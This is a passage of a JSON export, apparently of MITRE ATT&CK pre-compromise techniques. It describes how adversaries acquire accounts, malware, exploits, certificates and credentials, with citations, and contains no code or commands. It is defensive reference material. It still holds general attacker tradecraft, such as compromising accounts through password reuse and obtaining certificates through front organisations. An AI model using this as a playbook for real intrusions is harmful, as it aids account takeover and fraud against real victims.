    "technique_description": "<p>Before compromising a victim, adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>.(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of <a href=\"https://attack.mitre.org/techniques/T1585/001\">Social Media Accounts</a>, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: <a href=\"https://attack.mitre.org/techniques/T1583/001\">Domains</a>).(Citation: Mandiant APT1)<!-- raw HTML omitted --><!-- raw HTML omitted -->To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro R980 2016",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/r980-ransomware-disposable-email-service/",
        "description": "Antazo, F. and Yambao, M. (2016, August 10). R980 Ransomware Found Abusing Disposable Email Address Service. Retrieved October 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--274770e0-2612-4ccf-a678-ef8e7bad365d",
    "platform": "pre",
    "tid": "T1586.001",
    "technique": "Social Media Accounts",
    "tactic": "resource-development",
    "datasources": "social-media-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. <a href=\"https://attack.mitre.org/techniques/T1585/001\">Social Media Accounts</a>), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. <!-- raw HTML omitted --><!-- raw HTML omitted -->A variety of methods exist for compromising social media accounts, such as gathering credentials via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: <a href=\"https://attack.mitre.org/techniques/T1566/003\">Spearphishing via Service</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "AnonHBGary",
        "url": "https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/",
        "description": "Bright, P. (2011, February 15). Anonymous speaks: the inside story of the HBGary hack. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "NEWSCASTER2014",
        "url": "https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation",
        "description": "Lennon, M. (2014, May 29). Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHatRobinSage",
        "url": "http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf",
        "description": "Ryan, T. (2010). “Getting In Bed with Robin Sage.”. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b",
    "platform": "pre",
    "tid": "T1586.002",
    "technique": "Email Accounts",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: <a href=\"https://attack.mitre.org/techniques/T1583/001\">Domains</a>).<!-- raw HTML omitted --><!-- raw HTML omitted -->A variety of methods exist for compromising email accounts, such as gathering credentials via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use a compromised email account to hijack existing email threads with targets of interest.</p>\n",
    "technique_references": [
      {
        "source_name": "AnonHBGary",
        "url": "https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/",
        "description": "Bright, P. (2011, February 15). Anonymous speaks: the inside story of the HBGary hack. Retrieved March 9, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0",
    "platform": "pre",
    "tid": "T1587.001",
    "technique": "Malware",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors, packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)<!-- raw HTML omitted --><!-- raw HTML omitted -->As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary’s malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.<!-- raw HTML omitted --><!-- raw HTML omitted -->Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of <a href=\"https://attack.mitre.org/techniques/T1583/006\">Web Services</a>.(Citation: FireEye APT29)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Sofacy",
        "url": "https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/",
        "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, December 4). Sofacy APT hits high profile targets with updated toolset. Retrieved December 10, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "ActiveMalwareEnergy",
        "url": "https://arstechnica.com/information-technology/2014/06/active-malware-operation-let-attackers-sabotage-us-energy-industry/",
        "description": "Dan Goodin. (2014, June 30). Active malware operation let attackers sabotage US energy industry. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FBI Flash FIN7 USB",
        "url": "https://www.losangeles.va.gov/documents/MI-000120-MW.pdf",
        "description": "Federal Bureau of Investigation, Cyber Division. (2020, March 26). FIN7 Cyber Actors Targeting US Businesses Through USB Keystroke Injection Attacks. Retrieved October 14, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye APT29",
        "url": "https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf",
        "description": "FireEye Labs. (2015, July). HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group. Retrieved September 17, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf",
    "platform": "pre",
    "tid": "T1587.002",
    "technique": "Code Signing Certificates",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don’t know who issued the certificate or who the author is.<!-- raw HTML omitted --><!-- raw HTML omitted -->Prior to <a href=\"https://attack.mitre.org/techniques/T1553/002\">Code Signing</a>, adversaries may develop self-signed code signing certificates for use in operations.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Code Signing",
        "url": "https://en.wikipedia.org/wiki/Code_signing",
        "description": "Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1cec9319-743b-4840-bb65-431547bce82a",
    "platform": "pre",
    "tid": "T1587.003",
    "technique": "Digital Certificates",
    "tactic": "resource-development",
    "datasources": "ssl-tls-certificates",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner’s identity, and the digital signature of an entity that has verified the certificate’s contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: <a href=\"https://attack.mitre.org/techniques/T1071/001\">Web Protocols</a>) or even enabling <a href=\"https://attack.mitre.org/techniques/T1557\">Man-in-the-Middle</a> if added to the root of trust (i.e. <a href=\"https://attack.mitre.org/techniques/T1553/004\">Install Root Certificate</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Splunk Kovar Certificates 2017",
        "url": "https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html",
        "description": "Kovar, R. (2017, December 11). Tall Tales of Hunting with TLS/SSL Certificates. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2",
    "platform": "pre",
    "tid": "T1587.004",
    "technique": "Exploits",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via <a href=\"https://attack.mitre.org/techniques/T1588/006\">Vulnerabilities</a> to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary’s exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use exploits during various phases of the adversary lifecycle (i.e. <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>, <a href=\"https://attack.mitre.org/techniques/T1203\">Exploitation for Client Execution</a>, <a href=\"https://attack.mitre.org/techniques/T1068\">Exploitation for Privilege Escalation</a>, <a href=\"https://attack.mitre.org/techniques/T1211\">Exploitation for Defense Evasion</a>, <a href=\"https://attack.mitre.org/techniques/T1212\">Exploitation for Credential Access</a>, <a href=\"https://attack.mitre.org/techniques/T1210\">Exploitation of Remote Services</a>, and <a href=\"https://attack.mitre.org/techniques/T1499/004\">Application or System Exploitation</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "NYTStuxnet",
        "url": "https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html",
        "description": "William J. Broad, John Markoff, and David E. Sanger. (2011, January 15). Israeli Test on Worm Called Crucial in Iran Nuclear Delay. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Irongeek Sims BSides 2017",
        "url": "https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims",
        "description": "Stephen Sims. (2017, April 30). Microsoft Patch Analysis for Exploitation. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7807d3a4-a885-4639-a786-c1ed41484970",
    "platform": "pre",
    "tid": "T1588.001",
    "technique": "Malware",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
    "platform": "pre",
    "tid": "T1588.002",
    "technique": "Tool",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: <a href=\"https://attack.mitre.org/software/S0029\">PsExec</a>). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as <a href=\"https://attack.mitre.org/software/S0154\">Cobalt Strike</a>. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).</p>\n",
    "technique_references": [
      {
        "source_name": "Recorded Future Beacon 2019",
        "url": "https://www.recordedfuture.com/identifying-cobalt-strike-servers/",
        "description": "Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15",
    "platform": "pre",
    "tid": "T1588.003",
    "technique": "Code Signing Certificates",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don’t know who issued the certificate or who the author is.<!-- raw HTML omitted --><!-- raw HTML omitted -->Prior to <a href=\"https://attack.mitre.org/techniques/T1553/002\">Code Signing</a>, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Code Signing",
        "url": "https://en.wikipedia.org/wiki/Code_signing",
        "description": "Wikipedia. (2015, November 10). Code Signing. Retrieved March 31, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
    "platform": "pre",
    "tid": "T1588.004",
    "technique": "Digital Certificates",
    "tactic": "resource-development",
    "datasources": "ssl-tls-certificates",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner’s identity, and the digital signature of an entity that has verified the certificate’s contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: <a href=\"https://attack.mitre.org/techniques/T1071/001\">Web Protocols</a>) or even enabling <a href=\"https://attack.mitre.org/techniques/T1557\">Man-in-the-Middle</a> if the certificate is trusted or otherwise added to the root of trust (i.e. <a href=\"https://attack.mitre.org/techniques/T1553/004\">Install Root Certificate</a>). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise)<!-- raw HTML omitted --><!-- raw HTML omitted -->Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let’s Encrypt FAQ)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.</p>\n",
    "technique_references": [
      {
        "source_name": "DiginotarCompromise",
        "url": "https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/",
        "description": "Fisher, D. (2012, October 31). Final Report on DigiNotar Hack Shows Total Compromise of CA Servers. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Let's Encrypt FAQ",
        "url": "https://letsencrypt.org/docs/faq/",
        "description": "Let's Encrypt. (2020, April 23). Let's Encrypt FAQ. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Splunk Kovar Certificates 2017",
        "url": "https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html",
        "description": "Kovar, R. (2017, December 11). Tall Tales of Hunting with TLS/SSL Certificates. Retrieved October 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Recorded Future Beacon Certificates",
        "url": "https://www.recordedfuture.com/cobalt-strike-servers/",
        "description": "Insikt Group. (2019, June 18). A Multi-Method Approach to Identifying Rogue Cobalt Strike Servers. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636",
    "platform": "pre",
    "tid": "T1588.005",
    "technique": "Exploits",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use exploits during various phases of the adversary lifecycle (i.e. <a href=\"https://attack.mitre.org/techniques/T1190\">Exploit Public-Facing Application</a>, <a href=\"https://attack.mitre.org/techniques/T1203\">Exploitation for Client Execution</a>, <a href=\"https://attack.mitre.org/techniques/T1068\">Exploitation for Privilege Escalation</a>, <a href=\"https://attack.mitre.org/techniques/T1211\">Exploitation for Defense Evasion</a>, <a href=\"https://attack.mitre.org/techniques/T1212\">Exploitation for Credential Access</a>, <a href=\"https://attack.mitre.org/techniques/T1210\">Exploitation of Remote Services</a>, and <a href=\"https://attack.mitre.org/techniques/T1499/004\">Application or System Exploitation</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "Exploit Database",
        "url": "https://www.exploit-db.com/",
        "description": "Offensive Security. (n.d.). Exploit Database. Retrieved October 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TempertonDarkHotel",
        "url": "https://www.wired.co.uk/article/darkhotel-hacking-team-cyber-espionage",
        "description": "Temperton, J. (2015, August 10). Hacking Team zero-day used in new Darkhotel attacks. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "NationsBuying",
        "url": "https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html",
        "description": "Nicole Perlroth and David E. Sanger. (2013, July 12). Nations Buying as Hackers Sell Flaws in Computer Code. Retrieved March 9, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "PegasusCitizenLab",
        "url": "https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/",
        "description": "Bill Marczak and John Scott-Railton. (2016, August 24). The Million Dollar Dissident: NSO Group’s iPhone Zero-Days used against a UAE Human Rights Defender. Retrieved December 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Wired SandCat Oct 2019",
        "url": "https://www.vice.com/en/article/3kx5y3/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec",
        "description": "Zetter, K. (2019, October 3). Researchers Say They Uncovered Uzbekistan Hacking Operations Due to Spectacularly Bad OPSEC. Retrieved October 15, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
    "platform": "pre",
    "tid": "T1588.006",
    "technique": "Vulnerabilities",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. <a href=\"https://attack.mitre.org/techniques/T1588/005\">Exploits</a>) or to attempt to develop one themselves (i.e. <a href=\"https://attack.mitre.org/techniques/T1587/004\">Exploits</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "National Vulnerability Database",
        "url": "https://nvd.nist.gov/",
        "description": "National Vulnerability Database. (n.d.). National Vulnerability Database. Retrieved October 15, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161",
    "platform": "pre",
    "tid": "T1589.001",
    "technique": "Credentials",
    "tactic": "reconnaissance",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>. Adversaries may also compromise sites then include malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: <a href=\"https://attack.mitre.org/techniques/T1593/002\">Search Engines</a>, breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Gathering this information may reveal opportunities for other forms of reconnaissance (ex: <a href=\"https://attack.mitre.org/techniques/T1593\">Search Open Websites/Domains</a> or <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a>), establishing operational resources (ex: <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>), and/or initial access (ex: <a href=\"https://attack.mitre.org/techniques/T1133\">External Remote Services</a> or <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "ATT ScanBox",
        "url": "https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks",
        "description": "Blasco, J. (2014, August 28). Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Register Deloitte",
        "url": "https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/",
        "description": "Thomson, I. (2017, September 26). Deloitte is a sitting duck: Key systems with RDP open, VPN and proxy 'login details leaked'. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Register Uber",
        "url": "https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/",
        "description": "McCarthy, K. (2015, February 28). FORK ME! Uber hauls GitHub into court to find who hacked database of 50,000 drivers. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Detectify Slack Tokens",
        "url": "https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/",
        "description": "Detectify. (2016, April 28). Slack bot token leakage exposing business critical information. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Forbes GitHub Creds",
        "url": "https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196",
        "description": "Sandvik, R. (2014, January 14). Attackers Scrape GitHub For Cloud Service Credentials, Hijack Account To Mine Virtual Currency. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub truffleHog",
        "url": "https://github.com/dxa4481/truffleHog",
        "description": "Dylan Ayrey. (2016, December 31). truffleHog. Retrieved October 19, 2020.",
